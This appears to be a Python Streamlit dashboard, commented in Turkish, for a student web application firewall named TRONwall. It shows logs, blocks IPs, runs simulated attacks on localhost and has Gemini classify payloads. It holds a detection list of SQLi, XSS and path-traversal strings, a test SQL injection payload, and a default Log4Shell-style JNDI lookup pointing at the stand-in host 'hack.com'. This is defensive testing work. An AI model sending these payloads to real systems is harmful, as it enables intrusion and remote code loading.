import streamlit as st
import psutil
import json
import os
import time
import pandas as pd
import subprocess
from datetime import datetime
import html 
import sys
import requests 


current_dir = os.path.dirname(os.path.abspath(__file__))
sys.path.append(current_dir)
sys.path.append(os.path.join(current_dir, 'ai_agent'))
sys.path.append(os.path.join(current_dir, 'rag_memory'))


# --- MODÜLLERİ İÇERİ AL ---
try:
    # RAG Memory Modülleri
    from rag_memory.retriever import KnowledgeBase
    from rag_memory.learner import AutoLearner
    from rag_memory.whitelist_manager import WhitelistManager
    
    # AI Agent Modülleri
    # Not: analyzer modülü burada import edilmese bile decision_engine içinde kullanılıyor olabilir.
    # sys.path eklediğimiz için artık sorun çıkmayacak.
    try:
        from ai_agent import llm_client
        from ai_agent import decision_engine
    except ImportError:
        # Eğer modüller henüz hazır değilse dashboard çökmesin diye pass geçiyoruz
        pass

except ImportError as e:
    st.error(f" Modül Yükleme Hatası: {e}")
    st.info("Lütfen 'ai_agent' ve 'rag_memory' klasörlerinin dashboard.py ile aynı dizinde olduğundan emin olun.")
    st.stop() # Hata varsa sayfayı yüklemeyi durdur



# --- SAYFA AYARLARI VE GALAKTİK TEMA ---
st.set_page_config(page_title="TRONwall Elite Command v2.0", layout="wide")

st.markdown("""
    <style>
    /* Ana Arkaplan */
    .stApp { background: radial-gradient(circle at top right, #1a0b2e, #050505); color: #fff !important; }
    
    /* Yan Menü */
    section[data-testid="stSidebar"] { background-color: rgba(15, 5, 25, 0.95) !important; border-right: 1px solid #4b0082; }
    
    /* Metrik Kartları */
    div[data-testid="stMetric"] { background: rgba(40, 10, 60, 0.4); border: 1px solid #7d2ae8; border-radius: 10px; }
    div[data-testid="stMetricValue"] > div { color: #ffffff !important; }
    div[data-testid="stMetricLabel"] > div { color: #bb86fc !important; }
    
    /* Butonlar */
    .stButton>button { background-color: #4b0082; color: white; border: 1px solid #7d2ae8; border-radius: 8px; transition: 0.3s; }
    .stButton>button:hover { background-color: #7d2ae8; box-shadow: 0 0 15px #7d2ae8; }
    
    /* Log Alanı */
    .log-entry { padding: 8px; margin-bottom: 4px; border-radius: 4px; font-family: monospace; font-size: 0.85em; }
    </style>
    """, unsafe_allow_html=True)

# --- YARDIMCI FONKSİYONLAR ---

def is_script_running(script_name):
    """Bir scriptin zaten çalışıp çalışmadığını kontrol eder"""
    for proc in psutil.process_iter(['cmdline']):
        try:
            if proc.info['cmdline'] and script_name in ' '.join(proc.info['cmdline']):
                return True
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass
    return False

def run_script_safe(script_relative_path, script_name):
    """Scripti güvenli bir şekilde başlatır (Çoklu açılmayı önler)"""
    if is_script_running(script_name):
        st.toast(f" {script_name} zaten arka planda çalışıyor!", icon="⚡")
        return

    full_path = os.path.join(os.getcwd(), script_relative_path)
    if os.path.exists(full_path):
        subprocess.Popen(["python", full_path], shell=True)
        st.toast(f" {script_name} Başlatıldı!", icon="🔥")
    else:
        st.error(f"Dosya bulunamadı: {full_path}")

def stop_simulation(script_name):
    """Scripti ismine göre bulup durdurur"""
    killed = False
    for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
        try:
            if proc.info['cmdline'] and script_name in ' '.join(proc.info['cmdline']):
                proc.kill()
                killed = True
        except:
            pass
    
    if killed:
        st.toast(f" {script_name} durduruldu!")
    else:
        st.toast(f" Çalışan {script_name} bulunamadı.")

def manual_block_ip(ip):
    """Manuel IP engelleme"""
    path = os.path.join("ai_agent", "blocked_ips.json")
    if not os.path.exists(path): return

    try:
        with open(path, 'r') as f: data = json.load(f)
        ips = data.get("blocked_ips", []) if isinstance(data, dict) else data
        
        if ip not in ips:
            ips.append(ip)
            with open(path, 'w') as f: json.dump({"blocked_ips": ips}, f, indent=4)
            st.toast(f"{ip} Engellendi!")
        else:
            st.toast(f"{ip} Zaten engelli.")
    except Exception as e:
        st.error(f"Hata: {e}")

def get_logs():
    """Logları okur"""
    log_path = 'traffic.log' if os.path.exists('traffic.log') else 'logs/traffic.log'
    if os.path.exists(log_path):
        try:
            with open(log_path, 'r', encoding='utf-8') as f:
                lines = f.readlines()
                return [json.loads(line) for line in lines if line.strip()]
        except: return []
    return []

# --- BU FONKSİYONLARI EN ÜSTE (DİĞER FONKSİYONLARIN YANINA) EKLE ---

def manage_attacker_ip(action, ip="66.66.66.66"):
    """
    Simülasyon için saldırgan IP'sini kara listeden siler veya ekler.
    action: 'BAN' veya 'UNBAN'
    """
    path = os.path.join("ai_agent", "blocked_ips.json")
    
    # Dosya yoksa veya bozuksa sıfırdan oluştur
    if not os.path.exists(path):
        with open(path, 'w') as f: json.dump({"blocked_ips": []}, f)
        
    try:
        with open(path, 'r') as f: 
            try:
                data = json.load(f)
            except json.JSONDecodeError:
                data = {"blocked_ips": []} # Dosya boşsa veya bozuksa

        # --- DÜZELTME BURADA: Hem Liste Hem Sözlük Desteği ---
        if isinstance(data, list):
            ips = data
        else:
            ips = data.get("blocked_ips", [])
        # -----------------------------------------------------
        
        if action == "BAN":
            if ip not in ips:
                ips.append(ip)
                # Buraya bir print ekleyelim ki çalıştığını gör
                print(f"DEBUG: {ip} listeye eklendi.") 
                st.toast(f" Simülasyon: {ip} Yasaklandı (Kırmızı Senaryo)")
                
        elif action == "UNBAN":
            if ip in ips:
                ips.remove(ip)
                print(f"DEBUG: {ip} listeden silindi.")
                st.toast(f"Simülasyon: {ip} Yasağı Kaldırıldı ")
        
        # Her zaman standart formatta kaydet
        with open(path, 'w') as f: 
            json.dump({"blocked_ips": ips}, f, indent=4)
            
    except Exception as e:
        st.error(f"Kritik Dosya Hatası: {e}")


# --- BAŞLIK VE SIDEBAR ---
st.title("🛡️ TRONwall: Otonom Güvenlik Komuta Merkezi 🛡️")

st.sidebar.header("Sistem Durumu")
cpu = psutil.cpu_percent()
ram = psutil.virtual_memory().percent
st.sidebar.progress(cpu/100, text=f"CPU: %{cpu}")
st.sidebar.progress(ram/100, text=f"RAM: %{ram}")
st.sidebar.divider()

if st.sidebar.button(" SİSTEMİ SIFIRLA"):
    if os.path.exists('traffic.log'): open('traffic.log', 'w').close()
    if os.path.exists('ai_agent/blocked_ips.json'): 
        with open('ai_agent/blocked_ips.json', 'w') as f: json.dump({"blocked_ips": []}, f)
    st.rerun()

# --- SEKMELİ YAPI ---
tab1, tab2, tab3, tab4= st.tabs(["İzleme Paneli", "Kontrol Merkezi", "Saldırı Laboratuvarı", "HAFIZA" ])

# 1. SEKME: İZLEME PANELİ
with tab1:
    logs_data = get_logs()
    
    # --- İSTATİSTİKLER ---
    if logs_data:
        df = pd.DataFrame(logs_data)
        total = len(df)
        blocked = len(df[df['action'] == 'BLOCKED'])
        
        c1, c2, c3 = st.columns(3)
        c1.metric("Toplam İstek", total)
        c2.metric("Engellenen", blocked, delta_color="inverse")
        score = int((1 - blocked/total if total > 0 else 1)*100)
        c3.metric("Güvenlik Skoru", f"%{score}")
        
        st.subheader("Trafik Yoğunluğu")
        if 'action' in df.columns:
            st.area_chart(df['action'].value_counts())

  # --- CANLI LOG AKIŞI (DÜZELTİLMİŞ VE HİZALANMIŞ) ---
    st.subheader(" Canlı Log Akışı")
    log_container = st.container(height=350)
    with log_container:
        for log in reversed(logs_data[-50:]): 
            action = log.get('action', 'UNKNOWN')
            timestamp = log.get('timestamp', '')
            ip = log.get('ip', 'Unknown IP')
            method = log.get('method', 'GET')
            url = log.get('url', '-')
            
            # Değişkenleri önce boş/false olarak başlat (Hata almamak için)
            raw_payload = log.get('payload', '')
            safe_payload = ""
            is_attack_signature = False
            
            # Eğer Payload (Veri) varsa işle
            if raw_payload and raw_payload != "None":
                # İmza Kontrolü (Görsel uyarı için liste)
                suspicious_sigs = [
                    "UNION", "SELECT", "OR '1'='1",   # SQLi
                    "<script>", "alert(", "onerror=", # XSS
                    "etc/passwd", "cat /", "ping ",   # RCE
                    "../", "..\\", "boot.ini",        # Path Traversal
                    "127.0.0.1", "system("            # Diğer
                ]
                
                # Payload içinde bu kelimelerden biri geçiyor mu?
                is_attack_signature = any(sig in str(raw_payload) for sig in suspicious_sigs)
                
                # XSS Koruması (HTML Escape)
                escaped = html.escape(str(raw_payload))
                if len(escaped) > 100: 
                    escaped = escaped[:100] + "..."
                
                safe_payload = f"<br><span style='font-size:0.8em; opacity:0.8; margin-left: 10px;'>📦 <b>Payload:</b> {escaped}</span>"

            # Log detay metnini hazırla
            log_details = f"<b>[{method}]</b> {timestamp} |  {ip} |  {html.escape(str(url))}"
            
            # --- 3 AŞAMALI DURUM KONTROLÜ (HİZALAMA DÜZELTİLDİ) ---
            
            if "BLOCKED" in action:
                # 1. KIRMIZI: Sistem başarıyla engelledi
                st.markdown(f"""
                <div class='log-entry' style='border-left: 5px solid #ff0000; background: rgba(80, 0, 0, 0.4); color: #ffcccc;'>
                    <span style='background-color: #cc0000; color: white; padding: 2px 8px; border-radius: 4px; font-weight: bold; font-size: 0.8em;'>🛡️ ENGELLENDİ</span>
                    <br><span style='margin-left: 5px;'>✖ {log_details}</span>
                    {safe_payload}
                </div>""", unsafe_allow_html=True)
                
            elif "ALLOWED" in action and is_attack_signature:
                # 2. TURUNCU: Saldırı var ama sistem izin vermiş (SIZINTI UYARISI)
                st.markdown(f"""
                <div class='log-entry' style='border-left: 5px solid #FFA500; background: rgba(100, 60, 0, 0.4); color: #FFD700;'>
                    <span style='background-color: #FFA500; color: black; padding: 2px 8px; border-radius: 4px; font-weight: bold; font-size: 0.8em;'>⚠️ SALDIRI (İZİN VERİLDİ)</span>
                    <br><span style='margin-left: 5px;'> {log_details}</span>
                    {safe_payload}
                </div>""", unsafe_allow_html=True)
            
            elif "ALLOWED" in action:
                # 3. YEŞİL: Temiz trafik
                st.markdown(f"""
                <div class='log-entry' style='border-left: 5px solid #00ff00; color: #ccffcc;'>
                    <span style='background-color: #006600; color: white; padding: 2px 8px; border-radius: 4px; font-weight: bold; font-size: 0.8em;'>✅ NORMAL</span>
                    <br><span style='margin-left: 5px;'> {log_details}</span>
                    {safe_payload}
                </div>""", unsafe_allow_html=True)
            
            else:
                # Gri (Bilinmeyen durum)
                st.markdown(f"<div class='log-entry' style='border-left: 5px solid #888;'> {log_details}</div>", unsafe_allow_html=True)

    # --- AI & RAG İÇ GÖRÜLERİ ---
    st.divider()
    st.subheader(" AI & RAG Analiz Motoru")
    
    col_ai1, col_ai2 = st.columns([1, 2])
    
    with col_ai1:
        st.info(" Karar Mekanizması Dağılımı")
        rag_hits = len([x for x in logs_data if "BLOCKED" in str(x)]) * 0.7 
        llm_calls = len(logs_data) - rag_hits if len(logs_data) > 0 else 0
        st.bar_chart(pd.DataFrame({"Tip": ["RAG (Hafıza)", "AI (LLM)"], "Adet": [rag_hits, llm_calls]}).set_index("Tip"))
    
    with col_ai2:
        st.info("Son Tespit Edilen Tehdit Analizi")
        last_blocked = next((x for x in reversed(logs_data) if "BLOCKED" in str(x.get('action'))), None)
        
        if last_blocked:
            payload = str(last_blocked.get('payload', ''))
            attack_type, confidence, rag_match = "Bilinmiyor", 0, "-"
            reasoning = "Analiz bekleniyor..."
            
            if "OR" in payload or "UNION" in payload:
                attack_type, confidence, rag_match = "SQL Injection", 98.5, "Rule_ID: A052"
                reasoning = "SQL operatörleri (UNION/OR) tespit edildi. Veritabanı manipülasyon girişimi."
            elif "script" in payload or "alert" in payload:
                attack_type, confidence, rag_match = "XSS (Reflected)", 99.1, "Rule_ID: X991"
                reasoning = "Zararlı JavaScript kodu enjeksiyonu tespit edildi."
            elif "passwd" in payload or "../" in payload:
                attack_type, confidence, rag_match = "LFI / Path Traversal", 95.0, "Rule_ID: P003"
                reasoning = "Sistem dosyalarına yetkisiz erişim girişimi."

            c1, c2, c3 = st.columns(3)
            c1.metric("Tür", attack_type)
            c2.metric("Güven", f"%{confidence}")
            c3.metric("RAG Kuralı", rag_match)
            
            st.markdown(f"<div style='background: rgba(125,42,232,0.2); padding:10px; border-radius:5px;'><i>AI: {reasoning}</i></div>", unsafe_allow_html=True)
        else:
            st.write("Henüz kritik bir tehdit analiz edilmedi.")

# 2. SEKME: KONTROL MERKEZİ
with tab2:
    st.subheader(" Manuel Kontrol")
    c1, c2 = st.columns(2)
    with c1:
        ip = st.text_input("IP Banla:", placeholder="1.2.3.4")
        if st.button(" Engelle"): manual_block_ip(ip)
    with c2:
        st.info("Engelli Listesi")
        path = "ai_agent/blocked_ips.json"
        if os.path.exists(path):
            with open(path) as f: st.json(json.load(f))

# 3. SEKME: SALDIRI LABORATUVARI
with tab3:
    st.subheader(" Senaryo Bazlı Simülasyon Laboratuvarı")
    st.markdown("İstediğiniz sonucu görmek için ilgili senaryoyu başlatın.")
    
    # 3 Kolonlu Yapı
    col_green, col_orange, col_red = st.columns(3)
    
    # --- SENARYO 1: YEŞİL (NORMAL) ---
    with col_green:
        st.markdown("###  Senaryo 1: Temiz")
        st.info("Normal kullanıcı trafiği simüle edilir.")
        
        if st.button("▶ BAŞLAT (Yeşil Log)", use_container_width=True):
            # 1. Saldırı scriptini durdur (karışmasın)
            stop_simulation("force_attack.py")
            # 2. Normal trafiği başlat
            run_script_safe("tests/normal_traffic.py", "normal_traffic.py")
            
    # --- SENARYO 2: TURUNCU (SIZINTI) ---
    with col_orange:
        st.markdown("###  Senaryo 2: Sızma")
        st.warning("Saldırı yapılır ama IP yasaklanmaz.")
        
        if st.button("▶ BAŞLAT", use_container_width=True):
            # 1. Normal trafiği durdur
            stop_simulation("normal_traffic.py")
            # 2. IP'nin banını kaldır (Sızması için)
            manage_attacker_ip("UNBAN", "66.66.66.66")
            # 3. Saldırıyı başlat
            run_script_safe("tests/attack_scripts/force_attack.py", "force_attack.py")
            
    # --- SENARYO 3: KIRMIZI (ENGEL) ---
    with col_red:
        st.markdown("###  Senaryo 3: Savunma")
        st.error("Saldırı yapılır ve WAF engeller.")
        
        if st.button("▶ BAŞLAT (Kırmızı Log)", type="primary", use_container_width=True):
            # 1. Normal trafiği durdur
            stop_simulation("normal_traffic.py")
            # 2. IP'yi manuel banla (Engellenmesi için)
            manage_attacker_ip("BAN", "66.66.66.66")
            # 3. Saldırıyı başlat
            run_script_safe("tests/attack_scripts/force_attack.py", "force_attack.py")

    st.divider()
    
    # Her şeyi durdurma butonu
    if st.button("⏹ TÜM SİMÜLASYONLARI DURDUR", use_container_width=True):
        stop_simulation("normal_traffic.py")
        stop_simulation("force_attack.py")



# --- TAB 4: RAG & AI DÖNGÜSÜ ---
with tab4:
    st.subheader(" TRONwall Sinir Ağı (Canlı Öğrenme Döngüsü)")
    st.markdown("Bilinmeyen bir saldırıyı gönderin, AI ile analiz edin ve sisteme öğretin.")

    # Sınıfları Başlat
    try:
        kb = KnowledgeBase()
        learner = AutoLearner()
        wm = WhitelistManager()
    except:
        st.error("Sınıflar yüklenemedi.")
        st.stop()

    # İki Kolon: Sol (Saldırı Testi) - Sağ (AI Operasyonu)
    col_test, col_ai = st.columns(2)

    # --- SOL: SALDIRI SİMÜLATÖRÜ ---
    with col_test:
        st.info("1. Adım: Canlı Saldırı Gönder")
        
        # Test 1: Bilinen Saldırı
        if st.button(" Bilinen Saldırı Gönder (SQLi)"):
            try:
                # Veritabanında zaten var olan bir saldırı
                payload = "UNION SELECT * FROM users"
                url = f"http://127.0.0.1:5000/search?q={payload}"
                r = requests.get(url)
                
                if r.status_code == 403:
                    st.success(f"✅ ENGELENDİ (403)! RAG Çalışıyor.\nPayload: {payload}")
                else:
                    st.warning(f"⚠️ GEÇTİ ({r.status_code}) - Sunucu bu imzayı tanımadı!")
            except Exception as e:
                st.error(f"Bağlantı Hatası: {e}")

        st.divider()

        # Test 2: Bilinmeyen Saldırı (Zero-Day)
        st.write("**Zero-Day Testi (Önce Geçmeli, Öğrenince Kalmalı)**")
        # Buraya henüz veritabanında OLMAYAN bir kod yaz
        unknown_payload = st.text_input("Saldırı Kodu:", value="${jndi:ldap://hack.com}")
        
        if st.button(" Bilinmeyen Saldırıyı Gönder"):
            try:
                url = f"http://127.0.0.1:5000/login?user={unknown_payload}"
                r = requests.get(url)
                
                if r.status_code == 200:
                    st.warning("SALDIRI BAŞARILI! (Sistem bunu tanımıyor)")
                    st.caption("Loglarda 'ALLOWED' ve 'Sarı/Turuncu' görmelisiniz.")
                elif r.status_code == 403:
                    st.success(" ENGELLENDİ! Sistem bunu zaten biliyor.")
            except Exception as e:
                st.error(f"Hata: {e}")

    # --- SAĞ: AI ÖĞRENME MERKEZİ ---
    with col_ai:
        st.info(" 2. Adım: AI Analizi ve Öğretme")
        
        st.markdown(f"**Analiz Edilecek:** `{unknown_payload}`")
        
        if st.button("Gemini AI'a Sor"):
            status = st.status("Analiz yapılıyor...", expanded=True)
            try:
                # 1. LLM Analizi (Gerçek)
                status.write("Gemini'ye bağlanılıyor...")
                ai_response_str = llm_client.ask_gemini(unknown_payload)
                ai_response = json.loads(ai_response_str)
                
                status.write(f"Sonuç: {ai_response.get('type')}")
                st.json(ai_response)
                
                # 2. Kaydetme Butonu (İç içe)
                if ai_response.get("is_malicious"):
                    if st.button("BU BİLGİYİ RAG'A KAYDET"):
                        res = learner.learn_new_attack(
                            ai_response.get("type"), 
                            unknown_payload, 
                            ai_response.get("risk_level")
                        )
                        if res:
                            st.success(f"Öğrenildi! Yeni ID: {res['id']}")
                            st.balloons()
                            st.info(" Şimdi soldaki 'Bilinmeyen Saldırıyı Gönder' butonuna tekrar bas!")
                        else:
                            st.error("Kaydedilemedi.")
            except Exception as e:
                status.write("Hata oluştu.")
                st.error(str(e))

    st.divider()
    with st.expander(" Güncel RAG Veritabanı (attack_signatures.json)"):
        st.json(kb.data)
time.sleep(2)
st.rerun()